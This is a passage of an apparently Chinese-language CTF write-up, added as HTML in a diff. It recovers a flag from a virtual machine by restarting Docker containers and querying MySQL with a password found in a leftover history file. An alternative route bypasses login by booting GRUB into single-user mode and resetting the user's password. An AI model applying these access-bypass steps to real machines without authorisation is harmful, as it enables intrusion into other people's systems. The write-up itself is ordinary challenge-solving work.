+<p>2.输入重新设置的密码，成功进入，桌面直接看到mimi,txt。点开就可以发现像是命令行</p>
+<p>history，分析 一下就可以看到其实就是开了两个docker容器，显而易见下一步就是进到</p>
+<p>容器里找东西</p>
+<hr>
+<p>3.直接运行创建容器的命令，得到原有的镜像ID（因为会自动报错，回显已经占用的ID)，</p>
+<p>docker start 9e7aa，可以看到mysql类型的容器TeamGipsyctf1已经开启，同样方法</p>
+<p>开启TeamGipsyctf2</p>
+<hr>
+<p>4.docker exec -it ID &#x2F;bin&#x2F;bash命令进入对应容器 启动mysql mysql -uroot</p>
+<p>-p，密码就在mimi.txt中，输入password_is_me，进入数据库，show databases;</p>
+<p>发现特殊database，use TeamGipsy;</p>
+<hr>
+<p>5.show tables; 看表名，CTF和TG选一个找，最终在TG的flaghere中得到flag 语句：</p>
+<p>select * from TG</p>
+<hr>
+<p>还有另一种解法，不需要用到docke操作</p>
+<p>狂按ESC键进到GRUP里面，加一个single</p>
+<p>成功进入终端</p>
+<p>发现用户桌面有个mimi.txt</p>
+<p>是history历史操作，对docker有操作，目前终端docker没有启动，passwd改一下用户的密码，exit退出single模式进入系统，方便操作</p>
+<p>​	docker image list只有个mysql的镜像，其他的应该是被删了</p>
+<p>​	于是猜想flag应在在docker镜像的目录里面</p>
+<p>​	由于没学过docker的文件结构</p>
+<p>​	直接grep搜索找一下flag，注意sudo</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">grep -<span class="hljs-attribute">r</span> CTF&#123; /<span class="hljs-selector-tag">var</span>/lib/docker<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
